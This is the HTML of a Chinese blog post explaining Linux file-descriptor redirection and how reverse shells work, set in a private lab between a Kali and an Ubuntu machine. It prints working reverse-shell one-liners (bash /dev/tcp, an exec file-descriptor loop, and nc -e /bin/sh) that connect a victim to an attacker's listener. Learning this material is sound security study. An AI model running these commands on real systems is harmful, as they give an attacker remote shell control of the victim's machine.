@@ -1,0 +1,850 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="总结性学习一下。">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux反弹shell学习">
+<meta property="og:url" content="https://dopaminer.github.io/2020/05/06/Linux反弹shell学习/index.html">
+<meta property="og:site_name" content="Dopamine&#39;s Blog">
+<meta property="og:description" content="总结性学习一下。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605144836.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605150513.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605172904.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605174621.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605175236.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605175301.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605180047.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605180329.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605180533.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605182522.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605182839.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605231642.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606001045.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606092744.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606093518.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606093651.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606094001.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606105040.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606105056.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606105741.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606105727.png">
+<meta property="og:updated_time" content="2020-06-06T03:24:12.769Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux反弹shell学习">
+<meta name="twitter:description" content="总结性学习一下。">
+<meta name="twitter:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605144836.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://dopaminer.github.io/2020/05/06/Linux反弹shell学习/">
+
+
+
+
+
+  <title>Linux反弹shell学习 | Dopamine's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Dopamine's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://dopaminer.github.io/2020/05/06/Linux反弹shell学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D0pamine">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/头像.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dopamine's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux反弹shell学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-06T11:23:10+08:00">
+                2020-05-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>总结性学习一下。</p>
+<a id="more"></a>
+
+<h3 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 前置知识"></a>0x00 前置知识</h3><h4 id="1-文件描述符"><a href="#1-文件描述符" class="headerlink" title="1.文件描述符"></a>1.文件描述符</h4><p>在Linux里一切皆文件，文件又可分为普通文件、目录文件、链接文件和设备文件。文件描述符是内核为了高效管理（跟踪）已被打开的文件所创建的索引，是一个非负整数，用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符。程序刚刚启动时，0是标准输入，1是标准输出，2是标准错误。如果此刻打开一个新文件，其文件描述符则为3，以此类推。</p>
+<p><strong>每一条shell命令都会继承父进程的文件描述符，所以所有的shell命令都有默认的三个文件描述符。</strong></p>
+<p>一条命令执行前会按照默认的情况绑定，比如默认标准输出1绑定的是显示器，如果我们不想让输出显示在显示器上，而是输出到其他设备或者文件中，就要进行重定向操作。</p>
+<h4 id="2-重定向"><a href="#2-重定向" class="headerlink" title="2.重定向"></a>2.重定向</h4><p>重定向是针对文件描述符的操作，有两种重定向：</p>
+<blockquote>
+<p>输入重定向 &lt; &lt;&lt;</p>
+<p>输出重定向 &gt; &gt;&gt; </p>
+</blockquote>
+<p>规则：</p>
+<p>1.bash执行指令时，首先检查指令中存不存在重定向符，如果存在，那么就对文件描述符进行重定向，再把重定向去掉，执行指令。</p>
+<p>2.当指令中存在多个重定向，不能随便改变顺序，因为重定向为从左到右解析，如果改变顺序，可能导致输出结果完全不同。如果只有一个重定向，他在指令的位置可以任意规定。</p>
+<p>3.&lt; 是对标准输入 0 的重定向，&gt; 是对标准输出 1 的重定向。</p>
+<h5 id="2-1输入重定向"><a href="#2-1输入重定向" class="headerlink" title="2.1输入重定向"></a>2.1输入重定向</h5><p>格式：[n]&lt; word （[n]和&lt;之间没有空格）</p>
+<p>说明：将文件描述符n重定向到word指代的文件（以只读方式打开），如果n省略就默认为0（标准输入）。</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605144836.png" alt></p>
+<p>解释一下后两个指令，解析器解析到’&lt;’时会先处理重定向，将标准输入重定向到file，然后解析cat，cat从标准输入读取指令时，就等于从file中读取指令了。</p>
+<h5 id="2-2输出重定向"><a href="#2-2输出重定向" class="headerlink" title="2.2输出重定向"></a>2.2输出重定向</h5><p>格式：[n]&gt; word</p>
+<p>说明：将文件描述符n重定向到word指代的文件（以写的方式打开），如果n省略则默认为1（标准输出）。</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605150513.png" alt></p>
+<h5 id="2-3标准输出与标准错误输出重定向"><a href="#2-3标准输出与标准错误输出重定向" class="headerlink" title="2.3标准输出与标准错误输出重定向"></a>2.3标准输出与标准错误输出重定向</h5><p>格式： &amp;&gt; word   或  &gt;&amp; word</p>
+<p>说明：将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的)</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605172904.png" alt></p>
+<p>上图表明，正确输出和错误输出都可以输出到文件。</p>
+<h5 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4.文件描述符的复制"></a>4.文件描述符的复制</h5><p>格式： [n]&lt;&amp;[m] / [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p>
+<p>说明：两个格式都将文件描述符n复制到m，但两者的区别是，前者是只读形式打开，后者是以写的形式打开</p>
+<p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p>
+<p>这里&amp;符号的目的是为了区分数字名字的文件和文件描述符，如果没有&amp;系统则会认为是将文件描述符重定向到了一个名字为数字的文件，而不是一个文件描述符。</p>
+<p>这里可以利用复制演示一下前面所说的不能随便调换重定向的顺序，如图</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605174621.png" alt></p>
+<p>第一条命令，初始时，子进程继承三个文件描述符</p>
+<img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605175236.png" style="zoom:50%;">
+
+<p>因为是从左往右解析的，先解析到<code>&gt; file</code>，就会把标准输出重定向到file</p>
+<img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605175301.png" style="zoom:50%;">
+
+<p>然后再解析<code>2&gt;&amp;1</code>，就会把错误输出也复制到标准输出</p>
+<img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605180047.png" style="zoom:50%;">
+
+<p>最后去除所有的重定向，执行cmd命令，错误输出就会重定向到file中，于是cat file时就可以看到输出了错误信息。</p>
+<p>第二条命令，先解析<code>2&gt;&amp;1</code>，先把错误输出复制到标准输出，</p>
+<img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605180329.png" style="zoom:50%;">
+
+<p>然后解析<code>&gt; file</code>，把标准输出重定向到file</p>
+<img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605180533.png" style="zoom:50%;">
+
+<p>然后去掉所有重定向，执行cmd命令，错误信息则会输出到显示器而不是file中。</p>
+<h5 id="5-exec-绑定重定向"><a href="#5-exec-绑定重定向" class="headerlink" title="5.exec 绑定重定向"></a>5.exec 绑定重定向</h5><p>格式： exec [n] &lt;&gt; file/[n]</p>
+<p>说明：这里的[n]&lt;&gt;word是以独写的放是打开word指代的文件，并将n重定向到该文件的操作，但是如果想用n指代word文件进行后续的操作，就需要用exec将n绑定到文件，如果n不指定，默认为标准输入。</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605182522.png" alt></p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605182839.png" alt></p>
+<p>这里我就不是很懂为什么还要重新绑定一次才能再cat到，可能是自动结束进程了？这里留一个问号。</p>
+<h3 id="0x01-反弹shell"><a href="#0x01-反弹shell" class="headerlink" title="0x01 反弹shell"></a>0x01 反弹shell</h3><h5 id="1-什么是反弹shell"><a href="#1-什么是反弹shell" class="headerlink" title="1.什么是反弹shell"></a>1.什么是反弹shell</h5><blockquote>
+<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。 那么什么情况下正向连接不太好用了呢？<br> * 某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。<br> * 由于防火墙等限制，对方机器只能发送请求，不能接收请求。<br> * 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。 那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。<br> 本质上是网络概念的客户端与服务端的角色反转。通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
+</blockquote>
+<h5 id="2-反弹shell的本质"><a href="#2-反弹shell的本质" class="headerlink" title="2.反弹shell的本质"></a>2.反弹shell的本质</h5><p>因为反弹shell有太多各种各样的漂亮语句，有时候乍一看感觉很难理解，所以要掌握反弹shell的本质，知道反弹shell的时候命令都在做什么，万变不离其宗，掌握了本质就可以做到触类旁通了。</p>
+<p>实验环境：</p>
+<blockquote>
+<p>攻击者：kali   ip：192.168.157.174</p>
+<p>受害者：Ubuntu  ip：192.168.157.181</p>
+</blockquote>
+<p>攻击者机器执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
+
+<p>受害者机器执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.157.174/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>解读一下就是，攻击者机器监听2333端口，受害者机器做如下操作</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bash -i</td>
+<td>产生一个交互式的shell</td>
+</tr>
+<tr>
+<td>&gt;&amp;</td>
+<td>将错误输出与标准输出都输出到重定向的文件</td>
+</tr>
+<tr>
+<td>/dev/tcp/192.168.157.174/2333</td>
+<td>目标主机与主机建立tcp连接</td>
+</tr>
+<tr>
+<td>0&gt;&amp;1</td>
+<td>将标准输入复制到标准输出</td>
+</tr>
+</tbody></table>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200605231642.png" alt></p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606001045.png" alt></p>
+<p>可以看到，攻击者的机器上出现了受害者机器的shell。</p>
+<p>并且在攻击者的机器上执行ifconfig命令，可以直接看到受害者的ip，并且受害者的机器上并不会有任何显示，于是我们知道，一个基本的反弹shell回路构成了。</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606092744.png" alt></p>
+<p>细看受害者机器执行的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.157.174/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>初始时其文件描述符指向为</p>
+<img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606093518.png" style="zoom:50%;">
+
+<p>解析<code>&gt;&amp;</code>后</p>
+<img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606093651.png" style="zoom:50%;">
+
+<p>解析<code>0&gt;&amp;1</code>后</p>
+<img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606094001.png" style="zoom:50%;">
+
+<p>所以，受害机器的命令输入，标准输出和错误输出都会出现在攻击机上，我们只需要在攻击机上执行各种命令就可以了，不需要在受害机上做任何操作，这样就实现了远程交互式shell，达到了反弹shell的目的。</p>
+<h5 id="3-常见的反弹shell语句理解"><a href="#3-常见的反弹shell语句理解" class="headerlink" title="3.常见的反弹shell语句理解"></a>3.常见的反弹shell语句理解</h5><p><strong>1.exec绑定文件描述符</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.157.174/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure>
+
+<p>这个语句做的操作是，把文件描述符5绑定至<code>/dev/tcp/192.168.157.174/2333</code>，后面的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command|while read line do .... done</span><br></pre></td></tr></table></figure>
+
+<p>就是输入一行指令，执行一行，前面的<code>cat &lt;&amp;5</code>就是从文件描述符5读入命令，后面的<code>&gt;&amp;5</code>就是把执行结果输出到文件描述符5，然后<code>2&gt;&amp;1</code>就是把错误输出复制到标准输出指向的地方，最后结束。所以说万变不离其宗，这个语句基本和上面写的<code>bash -i</code>是一样的原理。</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606105040.png" alt></p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606105056.png" alt></p>
+<p><strong>2.nc直接反弹shell</strong></p>
+<p>nc有-e选项的话，可以直接利用nc反弹shell</p>
+<p>攻击者监听2333端口，受害者机器上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.157.174 2333</span><br></pre></td></tr></table></figure>
+
+<p>可以直接反弹shell</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606105741.png" alt></p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200606105727.png" alt></p>
+<p>nc没有-e操作的话，可以修改默认nc为传统nc，环境为Ubuntu16.04</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install netcat-traditional//安装传统nc</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --config nc//修改系统默认nc为传统nc</span><br></pre></td></tr></table></figure>
+
+<p>还有各种反弹方式，可以看smi1e师傅的这篇<a href="https://www.smi1e.top/linux-%e5%8f%8d%e5%bc%b9shell%e6%96%b9%e6%b3%95/" target="_blank" rel="noopener">文章</a>，还有freebuf上这篇<a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">文章</a>，写的挺全面的，我就不赘述了，后续遇到了别的方式再补充上来。</p>
+<h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>反弹shell是一个比较普遍的技术，之前也用过，但是没有这么深入的总结原理和知识，自己总结一下感觉还是挺好的，以后看到这些语句，还是要多思考吧，原理都是一致的。</p>
+<h3 id="0x03-references"><a href="#0x03-references" class="headerlink" title="0x03 references"></a>0x03 references</h3><p><a href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/</a></p>
+<p><a href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/</a></p>
+<p><a href="https://www.smi1e.top/linux-%e5%8f%8d%e5%bc%b9shell%e6%96%b9%e6%b3%95/" target="_blank" rel="noopener">https://www.smi1e.top/linux-%e5%8f%8d%e5%bc%b9shell%e6%96%b9%e6%b3%95/</a></p>
+<p><a href="https://blog.csdn.net/ccwwff/article/details/48519119" target="_blank" rel="noopener">https://blog.csdn.net/ccwwff/article/details/48519119</a></p>
+<p><a href="https://xz.aliyun.com/t/5768" target="_blank" rel="noopener">https://xz.aliyun.com/t/5768</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/20/BUUCTF Web 刷题记录1-15/" rel="next" title="BUUCTF Web 刷题记录（1-15）">
+                <i class="fa fa-chevron-left"></i> BUUCTF Web 刷题记录（1-15）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/头像.jpg" alt="D0pamine">
+            
+              <p class="site-author-name" itemprop="name">D0pamine</p>
+              <p class="site-description motion-element" itemprop="description">Always for you.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前置知识"><span class="nav-number">1.</span> <span class="nav-text">0x00 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-文件描述符"><span class="nav-number">1.1.</span> <span class="nav-text">1.文件描述符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-重定向"><span class="nav-number">1.2.</span> <span class="nav-text">2.重定向</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1输入重定向"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1输入重定向</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-2输出重定向"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2输出重定向</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-3标准输出与标准错误输出重定向"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.3标准输出与标准错误输出重定向</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-文件描述符的复制"><span class="nav-number">1.2.4.</span> <span class="nav-text">4.文件描述符的复制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-exec-绑定重定向"><span class="nav-number">1.2.5.</span> <span class="nav-text">5.exec 绑定重定向</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-反弹shell"><span class="nav-number">2.</span> <span class="nav-text">0x01 反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-什么是反弹shell"><span class="nav-number">2.0.1.</span> <span class="nav-text">1.什么是反弹shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-反弹shell的本质"><span class="nav-number">2.0.2.</span> <span class="nav-text">2.反弹shell的本质</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-常见的反弹shell语句理解"><span class="nav-number">2.0.3.</span> <span class="nav-text">3.常见的反弹shell语句理解</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-总结"><span class="nav-number">3.</span> <span class="nav-text">0x02 总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-references"><span class="nav-number">4.</span> <span class="nav-text">0x03 references</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D0pamine</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
